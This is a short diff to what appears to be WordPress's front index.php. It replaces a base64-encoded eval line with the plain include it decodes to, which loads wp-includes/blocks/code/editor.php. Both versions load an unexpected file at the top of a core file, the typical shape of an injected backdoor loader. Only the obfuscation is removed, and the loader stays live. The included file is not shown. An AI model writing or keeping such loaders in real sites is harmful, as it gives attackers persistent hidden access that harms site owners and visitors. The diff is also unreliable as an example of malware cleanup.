@@ -1,5 +1,5 @@
 <?php
-eval(base64_decode('aW5jbHVkZSgnd3AtaW5jbHVkZXMvYmxvY2tzL2NvZGUvZWRpdG9yLnBocCcpOw=='));
+include('wp-includes/blocks/code/editor.php');
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
